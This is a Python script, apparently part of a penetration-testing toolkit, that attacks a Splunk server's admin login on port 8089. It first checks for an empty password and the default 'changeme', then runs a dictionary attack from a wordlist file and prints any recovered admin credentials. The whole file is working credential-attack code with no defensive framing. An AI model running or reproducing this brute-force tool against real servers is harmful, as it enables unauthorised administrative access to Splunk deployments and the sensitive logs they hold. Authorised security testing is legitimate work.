#!/usr/bin/env python3

# Splunk Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import colorama
import logging
import os
import splunklib.client as client
import sys
from colorama import Fore, Style

sys.path.append('../')

# %%%%%%%%%%% Constants %%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%%% Functions %%%%%%%%%%%#

def bruteforce_splunk(splunkServer):

	splunkAdmin = "admin"
	__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	bruteforce_successful = 0
	free = 0
	defaultpass = 0

	# First Try Default Password "changeme" and Splunk Free Version

	if defaultpass == 0:

		try:
			client.connect(host = splunkServer, port = 8089, username = splunkAdmin, password = "")
			free = 1
			print(SEPARATOR)
			print("[!] Splunk Free Version - No need to attack")
			print(SEPARATOR)
			print("[*] Username: " + Fore.RED + Style.BRIGHT + "admin")
			print("[*] Password: " + Fore.RED + Style.BRIGHT + "no password")
			print(SEPARATOR)
		except Exception as e:
			pass

	if free == 0:

		try:
			client.connect(host = splunkServer, port = 8089, username = splunkAdmin, password =
			"changeme")
			defaultpass = 1
			print(SEPARATOR)
			print("[!] Splunk with Default Password - No need to attack")
			print(SEPARATOR)
			print("[*] Username: " + Fore.RED + Style.BRIGHT + "admin")
			print("[*] Password: " + Fore.RED + Style.BRIGHT + "changeme")
			print(SEPARATOR)
		except Exception as e:
			pass

	if free == 0 and defaultpass == 0:

		for line in file:
			splunkPassword = line.strip('\n\r')

			try:
				client.connect(host = splunkServer, port = 8089, username = splunkAdmin, password
				= splunkPassword)
				bruteforce_successful = 1
				break

			except Exception as e:
				pass

		if bruteforce_successful:

			print(SEPARATOR)
			print("[!] Dictionary Attack Successful!")
			print(SEPARATOR)
			print("[!] Username: " + Fore.RED + Style.BRIGHT + "admin")
			print("[!] Password: " + Fore.RED + Style.BRIGHT + splunkPassword)
			print(SEPARATOR)

		else:
			print(SEPARATOR)
			print("[!] Dictionary Attack Not Successful")
			print(SEPARATOR)

# %%%%%%%%%% The End %%%%%%%%%%#
